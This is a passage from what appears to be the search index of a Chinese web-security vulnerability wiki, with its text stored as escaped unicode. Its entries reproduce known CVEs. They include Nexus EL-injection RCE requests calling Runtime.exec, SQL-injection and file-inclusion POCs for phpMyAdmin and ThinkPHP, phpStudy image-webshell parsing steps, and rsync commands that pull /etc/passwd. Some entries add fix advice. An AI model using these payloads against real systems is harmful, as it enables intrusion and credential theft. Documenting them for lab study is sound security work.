3\u7248\u672c\u4e3b\u8981\u652f\u6301\u7684\u4ed3\u5e93\uff08Repository\uff09\u5305\u62ec\u5982\u4e0b\uff1a bower\u3001docker\u3001maven\u3001npm\u3001nuget\u3001pypi\u3001raw\u3001rubygems\u3001yum","title":"nexus repository oss"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_1","text":"10199\u7684\u6f0f\u6d1e\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef\u89e6\u53d1\uff0c\u800c10204\u5219\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e24\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u539f\u56e0\u5747\u662f\u4e0d\u5b89\u5168\u7684\u6267\u884cEL\u8868\u8fbe\u5f0f\u5bfc\u81f4\u7684","title":"\u6f0f\u6d1e\u8be6\u60c5"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_2","text":"\u542f\u52a8\u6f0f\u6d1e\u73af\u5883 docker run -it -p 8081:8081 -d co0ontty/cve-2020-10199 \u67e5\u770b\u7528\u6237\u540d\u5bc6\u7801 \u67e5\u770b DOCKER CONTAINER ID docker ps \u67e5\u770b\u5bc6\u7801 \u5176\u4e2d bc91335e3518 \u4e3a DOCKER CONTAINER ID docker exec -it bc91335e3518 cat /root/sonatype-work/nexus3/admin.password \u8bbf\u95ee http://ip:8081","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10199","text":"\u547d\u4ee4\u6267\u884c\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 372 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"cleanup_CleanupPolicy\",\"method\":\"create\",\"data\":[{\"name\":\"co0ontty\",\"format\":\"$\\.{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /opt/cve-2020-10199')}\",\"notes\":\"222\",\"mode\":\"delete\",\"lastBlobUpdatedEnabled\":false,\"lastDownloadedEnabled\":false,\"releaseTypeEnabled\":false,\"regexEnabled\":false,\"criteria\":{}}],\"type\":\"rpc\",\"tid\":33} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10199-1.png) \u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a POST /service/rest/beta/repositories/apt/hosted HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 358 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close { \"name\": \"interna1l\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true, \"writePolicy\": \"allow_once\" }, \"cleanup\": { \"policyNames\": [\"co0ontty\"] }, \"apt\": { \"distribution\": \"bionic\" }, \"aptSigning\": { \"keypair\": \"string\", \"passphrase\": \"string\" } } ```","title":"cve-2020-10199"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#cve-2020-10204","text":"\u547d\u4ee4\u6267\u884c\u4e00\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 362 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"test\",\"version\":\"4\",\"firstName\":\"test\",\"lastName\":\"test\",\"email\":\"test@qq.com\",\"status\":\"active\",\"roles\":[\"nx-admin$\\.{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('touch /opt/co0ontty.success')}\"]}],\"type\":\"rpc\",\"tid\":20} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10204.png) \u547d\u4ee4\u6267\u884c\u4e8c\uff1a POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 214 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=6d9fd8c5-4b18-4680-b332-09600e9d34b5 Connection: close { \"name\": \"interna1l\", \"online\": true, \"group\": { \"memberNames\": [\"${'co0ontty'.toUpperCase()}\"] }, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true } } ```","title":"cve-2020-10204"},{"location":"Web%E5%AE%89%E5%85%A8/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/#_3","text":"\u8bf7\u5347\u7ea7\u7248\u672c\u5230 Nexus Repository Manager OSS/Pro 3.21.2 \u6216\u66f4\u9ad8\u7248\u672c \u851a\u84dd\u76fe\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u5df2\u652f\u6301\u5bf9 CVE-2020-10199 \u53ca CVE-2020-10204 \u7684\u9632\u5fa1","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 phpMyAdmin 4 < 4.9.4 phpMyAdmin 5 < 5.0.1 \u5df2\u77e5\u4e00\u4e2a\u7528\u6237\u540d\u5bc6\u7801 \u6f0f\u6d1e\u5229\u7528 \u00b6 \u6ce8\u5165\u70b9\u4e3ausername\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u8bed\u53e5\u683c\u5f0f\u5982\u4e0b http://**********/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server","title":"phpMyAdmin SQL\u6ce8\u5165(CVE-2020-0554)"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_1","text":"phpMyAdmin 4 < 4.9.4 phpMyAdmin 5 < 5.0.1 \u5df2\u77e5\u4e00\u4e2a\u7528\u6237\u540d\u5bc6\u7801","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%20SQL%E6%B3%A8%E5%85%A5%28CVE-2020-0554%29/#_2","text":"\u6ce8\u5165\u70b9\u4e3ausername\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u8bed\u53e5\u683c\u5f0f\u5982\u4e0b http://**********/server_privileges.php?ajax_request=true&validate_username=1&username=1%27and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))--+db=&token=c2064a8c5f437da931fa01de5aec6581&viewing_mode=server","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 phpMyAdmin 4.8.0-4.8.1 \u6f0f\u6d1ePOC \u00b6 http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd","title":"phpMyAdmin\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#_1","text":"phpMyAdmin 4.8.0-4.8.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#poc","text":"http://**********/index?target=db_sql.php%253f/../../../../../../../../etc/passwd","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 phpstudy \u5b58\u5728 nginx \u89e3\u6790\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5229\u7528\u4e0a\u4f20\u529f\u80fd\uff0c\u5c06\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u5408\u6cd5\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002 \u5f71\u54cd\u7248\u672c \u00b6 phpstudy <= 8.1.0.7 \u73af\u5883\u642d\u5efa \u00b6 \u4e0b\u8f7dphpstudy v8.1.0.7\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u5982\u4e0b \u6f0f\u6d1e\u5206\u6790 \u00b6 \u8be5\u6f0f\u6d1e\u5c5e\u4e8e\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3a\uff1a 1\u3001\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff0c\u5bfc\u81f4 nginx \u628a\u4ee5 .php \u7ed3\u5c3e\u7684\u6587\u4ef6\u4ea4\u7ed9 fastcgi \u5904\u7406\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 http://192.168.3.142:8088/123.gif/xxx.php\uff08\u4efb\u4f55\u670d\u52a1\u5668\u7aef\u4e0d\u5b58\u5728\u7684php\u6587\u4ef6\u5747\u53ef\uff0c\u6bd4\u5982X.php\uff09 2\u3001\u4f46\u662f fastcgi \u5728\u5904\u7406 xxx.php \u6587\u4ef6\u65f6\u53d1\u73b0\u6587\u4ef6\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u65f6 php.ini \u914d\u7f6e\u6587\u4ef6\u4e2d cgi.fix_pathinfo=1 \u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u9879\u914d\u7f6e\u7528\u4e8e\u4fee\u590d\u8def\u5f84\uff0c\u5982\u679c\u5f53\u524d\u8def\u5f84\u4e0d\u5b58\u5728\u5219\u91c7\u7528\u4e0a\u5c42\u8def\u5f84\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea4\u7531 fastcgi \u5904\u7406\u7684\u6587\u4ef6\u5c31\u53d8\u6210\u4e86 /123.gif. 3\u3001\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f php-fpm.conf \u4e2d\u7684 security.limit_extensions \u914d\u7f6e\u9879\u9650\u5236\u4e86 fastcgi \u89e3\u6790\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5373\u6307\u5b9a\u4ec0\u4e48\u7c7b\u578b\u7684\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790\uff09\uff0c\u6b64\u9879\u8bbe\u7f6e\u4e3a\u7a7a\u7684\u65f6\u5019\u624d\u5141\u8bb8 fastcgi \u5c06 .png \u7b49\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790. POC \u00b6 \u6b63\u5e38\u8bbf\u95ee\u56fe\u7247 http://192.168.3.142:8088/123.gif \u589e\u52a0\u540e\u7f00\u8bbf\u95ee\u5982\u4e0b\uff1a \u6210\u529f\u89e3\u6790php\u6587\u4ef6 http://192.168.3.142:8088/123.gif/xxx.php","title":"phpStudy nginx \u89e3\u6790\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","text":"phpstudy \u5b58\u5728 nginx \u89e3\u6790\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5229\u7528\u4e0a\u4f20\u529f\u80fd\uff0c\u5c06\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684\u5408\u6cd5\u6587\u4ef6\u7c7b\u578b\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","text":"phpstudy <= 8.1.0.7","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_3","text":"\u4e0b\u8f7dphpstudy v8.1.0.7\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u5982\u4e0b","title":"\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_4","text":"\u8be5\u6f0f\u6d1e\u5c5e\u4e8e\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u4e3a\uff1a 1\u3001\u7531\u4e8e\u914d\u7f6e\u9519\u8bef\uff0c\u5bfc\u81f4 nginx \u628a\u4ee5 .php \u7ed3\u5c3e\u7684\u6587\u4ef6\u4ea4\u7ed9 fastcgi \u5904\u7406\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 http://192.168.3.142:8088/123.gif/xxx.php\uff08\u4efb\u4f55\u670d\u52a1\u5668\u7aef\u4e0d\u5b58\u5728\u7684php\u6587\u4ef6\u5747\u53ef\uff0c\u6bd4\u5982X.php\uff09 2\u3001\u4f46\u662f fastcgi \u5728\u5904\u7406 xxx.php \u6587\u4ef6\u65f6\u53d1\u73b0\u6587\u4ef6\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u65f6 php.ini \u914d\u7f6e\u6587\u4ef6\u4e2d cgi.fix_pathinfo=1 \u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u9879\u914d\u7f6e\u7528\u4e8e\u4fee\u590d\u8def\u5f84\uff0c\u5982\u679c\u5f53\u524d\u8def\u5f84\u4e0d\u5b58\u5728\u5219\u91c7\u7528\u4e0a\u5c42\u8def\u5f84\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea4\u7531 fastcgi \u5904\u7406\u7684\u6587\u4ef6\u5c31\u53d8\u6210\u4e86 /123.gif. 3\u3001\u6700\u91cd\u8981\u7684\u4e00\u70b9\u662f php-fpm.conf \u4e2d\u7684 security.limit_extensions \u914d\u7f6e\u9879\u9650\u5236\u4e86 fastcgi \u89e3\u6790\u6587\u4ef6\u7684\u7c7b\u578b\uff08\u5373\u6307\u5b9a\u4ec0\u4e48\u7c7b\u578b\u7684\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790\uff09\uff0c\u6b64\u9879\u8bbe\u7f6e\u4e3a\u7a7a\u7684\u65f6\u5019\u624d\u5141\u8bb8 fastcgi \u5c06 .png \u7b49\u6587\u4ef6\u5f53\u505a\u4ee3\u7801\u89e3\u6790.","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"Web%E5%AE%89%E5%85%A8/phpStudy%20nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#poc","text":"\u6b63\u5e38\u8bbf\u95ee\u56fe\u7247 http://192.168.3.142:8088/123.gif \u589e\u52a0\u540e\u7f00\u8bbf\u95ee\u5982\u4e0b\uff1a \u6210\u529f\u89e3\u6790php\u6587\u4ef6 http://192.168.3.142:8088/123.gif/xxx.php","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/phpstudy%EF%BC%88%E5%B0%8F%E7%9A%AE%E6%A8%A1%E6%9D%BF%E5%AD%98%E5%9C%A8nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%89/","text":"\u7248\u672c\u5f71\u54cd \u00b6 phptsuy8.1.07\u7684Nginx1.5.11\u7248\u672c phpstudy\u4ecb\u7ecd \u00b6 PhpStudy\u56fd\u518512\u5e74\u8001\u724c\u516c\u76ca\u8f6f\u4ef6\uff0c\u96c6\u5b89\u5168\u3001\u9ad8\u6548\u3001\u529f\u80fd\u4e0e\u4e00\u4f53\uff0c\u5df2\u83b7\u5f97\u5168\u7403\u7528\u6237\u8ba4\u53ef\u5b89\u88c5\uff0c\u8fd0\u7ef4\u4e5f\u9ad8\u6548\u3002\u652f\u6301\u4e00\u952eLAMP\u3001LNMP\u3001\u96c6\u7fa4\u3001\u76d1\u63a7\u3001\u7f51\u7ad9\u3001\u6570\u636e\u5e93\u3001FTP\u3001\u8f6f\u4ef6\u4e2d\u5fc3\u3001\u4f2a\u9759\u6001\u3001\u4e91\u5907\u4efd\u3001SSL\u3001\u591a\u7248\u672c\u5171\u5b58\u3001Nginx\u53cd\u5411\u4ee3\u7406\u3001\u670d\u52a1\u5668\u9632\u706b\u5899\u3001web\u9632\u706b\u5899\u3001\u76d1\u63a7\u5927\u5c4f\u7b49100\u591a\u9879\u670d\u52a1\u5668\u7ba1\u7406\u529f\u80fd \u6f0f\u6d1e\u590d\u73b0 \u00b6 1\u3001\u53cc\u51fb\u6253\u5f00phpstudy\uff0c\u542f\u52a8nginx\u4e2d\u95f4\u4ef6\u548cmysql\u3002 2.\u53f3\u51fb\u521b\u5efa\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u5199\u5165 3.\u7136\u540e\u548c\u4e00\u4e2a\u56fe\u7247\u5408\u6210\u4e00\u4e2a\u56fe\u7247\u9a6c\uff0c\u7136\u540e\u518d\u6253\u5f00cmd\uff0c\u8fdb\u5165\u5b58\u653e\u56fe\u7247\u4ee5\u53ca\u6728\u9a6c\u7684\u76ee\u5f55\uff0c\u8f93\u5165\u547d\u4ee4\uff1a copy 1.png/b+1.txt/a 3.png 4.\u6253\u5f00\u672c\u5730\u642d\u5efa\u7684\u9776\u573a\uff0c\u4f7f\u7528upload-labs\u3002\u5728pass-01\u4e0a\u4e0a\u4f20\u56fe\u7247\u9a6c 5..\u6f0f\u6d1e\u5229\u7528\uff0c\u5728.png\u540e\u9762\u6dfb\u52a0/xxx.php\uff0curl\u4e3a\uff1a http://127.0.0.1/upload-labs-master/upload/3.png/xx.php \u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u3002","title":"phpstudy\uff08\u5c0f\u76ae\u6a21\u677f\u5b58\u5728nginx\u89e3\u6790\u6f0f\u6d1e\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/phpstudy%EF%BC%88%E5%B0%8F%E7%9A%AE%E6%A8%A1%E6%9D%BF%E5%AD%98%E5%9C%A8nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%89/#_1","text":"phptsuy8.1.07\u7684Nginx1.5.11\u7248\u672c","title":"\u7248\u672c\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/phpstudy%EF%BC%88%E5%B0%8F%E7%9A%AE%E6%A8%A1%E6%9D%BF%E5%AD%98%E5%9C%A8nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%89/#phpstudy","text":"PhpStudy\u56fd\u518512\u5e74\u8001\u724c\u516c\u76ca\u8f6f\u4ef6\uff0c\u96c6\u5b89\u5168\u3001\u9ad8\u6548\u3001\u529f\u80fd\u4e0e\u4e00\u4f53\uff0c\u5df2\u83b7\u5f97\u5168\u7403\u7528\u6237\u8ba4\u53ef\u5b89\u88c5\uff0c\u8fd0\u7ef4\u4e5f\u9ad8\u6548\u3002\u652f\u6301\u4e00\u952eLAMP\u3001LNMP\u3001\u96c6\u7fa4\u3001\u76d1\u63a7\u3001\u7f51\u7ad9\u3001\u6570\u636e\u5e93\u3001FTP\u3001\u8f6f\u4ef6\u4e2d\u5fc3\u3001\u4f2a\u9759\u6001\u3001\u4e91\u5907\u4efd\u3001SSL\u3001\u591a\u7248\u672c\u5171\u5b58\u3001Nginx\u53cd\u5411\u4ee3\u7406\u3001\u670d\u52a1\u5668\u9632\u706b\u5899\u3001web\u9632\u706b\u5899\u3001\u76d1\u63a7\u5927\u5c4f\u7b49100\u591a\u9879\u670d\u52a1\u5668\u7ba1\u7406\u529f\u80fd","title":"phpstudy\u4ecb\u7ecd"},{"location":"Web%E5%AE%89%E5%85%A8/phpstudy%EF%BC%88%E5%B0%8F%E7%9A%AE%E6%A8%A1%E6%9D%BF%E5%AD%98%E5%9C%A8nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%89/#_2","text":"1\u3001\u53cc\u51fb\u6253\u5f00phpstudy\uff0c\u542f\u52a8nginx\u4e2d\u95f4\u4ef6\u548cmysql\u3002 2.\u53f3\u51fb\u521b\u5efa\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u5199\u5165 3.\u7136\u540e\u548c\u4e00\u4e2a\u56fe\u7247\u5408\u6210\u4e00\u4e2a\u56fe\u7247\u9a6c\uff0c\u7136\u540e\u518d\u6253\u5f00cmd\uff0c\u8fdb\u5165\u5b58\u653e\u56fe\u7247\u4ee5\u53ca\u6728\u9a6c\u7684\u76ee\u5f55\uff0c\u8f93\u5165\u547d\u4ee4\uff1a copy 1.png/b+1.txt/a 3.png 4.\u6253\u5f00\u672c\u5730\u642d\u5efa\u7684\u9776\u573a\uff0c\u4f7f\u7528upload-labs\u3002\u5728pass-01\u4e0a\u4e0a\u4f20\u56fe\u7247\u9a6c 5..\u6f0f\u6d1e\u5229\u7528\uff0c\u5728.png\u540e\u9762\u6dfb\u52a0/xxx.php\uff0curl\u4e3a\uff1a http://127.0.0.1/upload-labs-master/upload/3.png/xx.php \u6f0f\u6d1e\u5229\u7528\u5b8c\u6210\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 rsync\u662fLinux\u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u652f\u6301\u901a\u8fc7rsync\u534f\u8bae\u3001ssh\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u4f20\u8f93\u3002\u5176\u4e2drsync\u534f\u8bae\u9ed8\u8ba4\u76d1\u542c873\u7aef\u53e3\uff0c\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86rsync\u670d\u52a1\uff0c\u5e76\u4e14\u6ca1\u6709\u914d\u7f6eACL\u6216\u8bbf\u95ee\u5bc6\u7801\uff0c\u6211\u4eec\u5c06\u53ef\u4ee5\u8bfb\u5199\u76ee\u6807\u670d\u52a1\u5668\u6587\u4ef6\u3002 \u73af\u5883\u642d\u5efa \u00b6 cd vulhub/rsync/common `````` docker-compose build && docker-compose build \u73af\u5883\u542f\u52a8\u540e\uff0c\u6211\u4eec\u7528rsync\u547d\u4ee4\u8bbf\u95ee\u4e4b\uff1a \u6709\u4e00\u4e2asrc\u6a21\u5757\uff0c\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e2a\u6a21\u5757\u4e0b\u7684\u6587\u4ef6\uff1a rsync rsync://your-ip:873/src/ \u8fd9\u662f\u4e00\u4e2aLinux\u6839\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./ \u4fee\u590d\u5efa\u8bae \u00b6 \u914d\u7f6e\u53ea\u8bfb\u914d\u7f6e\u8ba4\u8bc1\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801","title":"rsync \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","text":"rsync\u662fLinux\u4e0b\u4e00\u6b3e\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u652f\u6301\u901a\u8fc7rsync\u534f\u8bae\u3001ssh\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u6587\u4ef6\u4f20\u8f93\u3002\u5176\u4e2drsync\u534f\u8bae\u9ed8\u8ba4\u76d1\u542c873\u7aef\u53e3\uff0c\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86rsync\u670d\u52a1\uff0c\u5e76\u4e14\u6ca1\u6709\u914d\u7f6eACL\u6216\u8bbf\u95ee\u5bc6\u7801\uff0c\u6211\u4eec\u5c06\u53ef\u4ee5\u8bfb\u5199\u76ee\u6807\u670d\u52a1\u5668\u6587\u4ef6\u3002","title":"\u524d\u8a00"},{"location":"Web%E5%AE%89%E5%85%A8/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_2","text":"cd vulhub/rsync/common `````` docker-compose build && docker-compose build \u73af\u5883\u542f\u52a8\u540e\uff0c\u6211\u4eec\u7528rsync\u547d\u4ee4\u8bbf\u95ee\u4e4b\uff1a \u6709\u4e00\u4e2asrc\u6a21\u5757\uff0c\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e2a\u6a21\u5757\u4e0b\u7684\u6587\u4ef6\uff1a rsync rsync://your-ip:873/src/ \u8fd9\u662f\u4e00\u4e2aLinux\u6839\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff1a rsync -av rsync://your-ip:873/src/etc/passwd ./","title":"\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_3","text":"\u914d\u7f6e\u53ea\u8bfb\u914d\u7f6e\u8ba4\u8bc1\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/thinkphp/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Thinkphp <= 3.2.3 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 /index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))","title":"Thinkphp"},{"location":"Web%E5%AE%89%E5%85%A8/thinkphp/#_1","text":"Thinkphp <= 